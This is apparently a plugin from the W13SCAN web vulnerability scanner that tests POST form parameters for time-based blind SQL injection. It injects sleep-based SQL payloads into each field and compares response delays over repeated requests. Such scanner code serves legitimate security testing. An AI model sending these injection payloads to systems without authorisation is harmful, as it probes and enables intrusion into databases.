#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/7/7 2:43 PM
# @Author  : w8ay
# @File    : post_sql_inject_time.py

import copy
import time

import requests

from W13SCAN.lib.const import ignoreParams, POST_HINT, Level
from W13SCAN.lib.output import out
from W13SCAN.lib.plugins import PluginBase


class W13SCAN(PluginBase):
    name = 'POST插件 基于时间的SQL注入'
    desc = '''目前支持POST方式的请求'''
    level = Level.HIGHT

    def audit(self):
        method = self.requests.command  # 请求方式 GET or POST
        headers = self.requests.get_headers()  # 请求头 dict类型
        url = self.build_url()  # 请求完整URL

        resp_data = self.response.get_body_data()  # 返回数据 byte类型
        resp_str = self.response.get_body_str()  # 返回数据 str类型 自动解码
        resp_headers = self.response.get_headers()  # 返回头 dict类型

        post_hint = self.requests.post_hint
        post_data = self.requests.post_data

        p = self.requests.urlparse
        params = self.requests.params
        netloc = self.requests.netloc

        if method == 'POST':
            if post_hint == POST_HINT.NORMAL:

                sql_flag = [
                    "'and(select+sleep({time})union/**/select+1)='",
                    '"and(select+sleep({time})union/**/select+1)="',
                    '/**/and(select+sleep({time})union/**/select+1)'
                ]
                for k, v in post_data.items():
                    if k.lower() in ignoreParams:
                        continue
                    data = copy.deepcopy(post_data)
                    for flag in sql_flag:
                        # first request
                        payload1 = flag.format(time=0)
                        data[k] = v + payload1
                        _ = time.time()
                        r = requests.post(url, data=data, headers=headers)
                        html1 = r.text
                        elapsed = time.time() - _

                        # second request
                        payload2 = flag.format(time=2)
                        data[k] = v + payload2
                        _ = time.time()
                        r2 = requests.post(url, data=data, headers=headers)
                        html2 = r2.text
                        elapsed2 = time.time() - _
                        if elapsed2 - elapsed > 1.5:
                            # 为了验证准确性，再来几次～
                            first_eclip = 0
                            num = 5
                            for i in range(num):
                                # first request
                                payload1 = v + flag.format(time=0)
                                data[k] = payload1
                                _ = time.time()
                                r = requests.post(url, data=data, headers=headers)
                                html1 = r.text
                                elapsed = time.time() - _
                                first_eclip += elapsed
                                time.sleep(0.1)
                            first_eclip = first_eclip / num

                            second_eclip = 0
                            # second request
                            for i in range(num):
                                payload2 = v + flag.format(time=2)
                                data[k] = payload2
                                _ = time.time()
                                r2 = requests.post(url, data=data, headers=headers)
                                html2 = r2.text
                                elapsed2 = time.time() - _
                                second_eclip += elapsed2
                                time.sleep(0.1)
                            second_eclip = second_eclip / num

                            if second_eclip - first_eclip > 1.5:
                                msg = [
                                    "{k}:{v1} 平均耗时 {time1}s".format(k=k, v1=payload1, time1=first_eclip),
                                    "{k}:{v2} 平均耗时 {time2}s".format(k=k, v2=payload2, time2=second_eclip)
                                ]
                                out.success(url, self.name, payload=k, condition=msg, data=str(data),
                                            raw=[r.raw, r2.raw])
                                break
